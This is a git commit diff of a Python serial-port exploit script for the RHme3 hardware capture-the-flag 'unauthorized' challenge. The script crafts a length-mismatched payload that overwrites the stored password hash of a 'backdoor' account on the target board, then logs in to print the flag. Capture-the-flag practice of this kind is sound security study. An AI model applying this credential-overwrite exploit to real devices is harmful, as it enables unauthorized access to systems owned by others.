9fba815fdbe7b926a85bef8acde496d9f6de162d
gorbatiy87 <33194123+gorbatiy87@users.noreply.github.com>
2018-05-08 11:02:40 +0300

    Update media_unuthorized.py

--- rhme3/unauthorized/media_unuthorized.py
+++ rhme3/unauthorized/media_unuthorized.py
@@ -1,6 +1,11 @@
 import serial
-from time import sleep
 import hashlib
+
+def read_until(tty,us):
+    s=tty.readline()
+    while not s.startswith(us):
+        s=tty.readline()
+    print s
 
 pasw="pass1"
 usrname="backdoor"
@@ -9,34 +14,25 @@ m=hashlib.sha256()
 m.update(pasw)
 pass_hash=m.digest()
 if ("\n" in pass_hash):
-    print "pass hash has 0x0a"
-print pass_hash.encode('hex')
+    print "pass hash has 0x0a choose other one"
+print "pass hash", pass_hash.encode('hex')
 
-target_address=0x3023-0x22 #location of pass hash (backdoor user)
-sp_base=0x3ebf
-#usr_ptr=target_address+0x22
-
-payload=pass_hash#+chr(usr_ptr&0xFF)+chr(usr_ptr>>8)+usrname
+target_address=0x3023-0x22  #location of pass hash (backdoor user)
+sp_base=0x3ebf 				#taked from debugger
 addr_diff=sp_base-target_address
-#print a
 
-
-with serial.Serial('/dev/ttyUSB0',115200) as tty:
-    sleep(2)
+with serial.Serial('/dev/ttyUSB0',115200,timeout=1) as tty:
     tty.write("\n")
-    sleep(1)
-    print tty.read(tty.in_waiting or 1)
+    read_until(tty,"Expected format:")
     
-    n1=len(payload)
+    n1=len(pass_hash)
     n2=addr_diff-len(str(n1))-len(":")-len(str(addr_diff))-len(":")-n1
-    print "send payload "+str(n1)+":"+str(n2)+":"+repr(payload)
     
-    tty.write(str(n1)+":"+str(n2)+":"+payload+"1\n")
-    sleep(20)
-    print tty.read(tty.in_waiting or 1)
+    print "send payload "+str(n1)+":"+str(n2)+":"+repr(pass_hash)
+    tty.write(str(n1)+":"+str(n2)+":"+pass_hash+"1\n")
+    read_until(tty,"Unknown user")
     
     print "send pass: "+str(len(usrname))+":"+str(len(pasw))+":"+usrname+pasw
-    
     tty.write(str(len(usrname))+":"+str(len(pasw))+":"+usrname+pasw+"\n")
-    sleep(20)
-    print tty.read(tty.in_waiting or 1)
+    read_until(tty,"Your flag is")
+    print tty.readline()
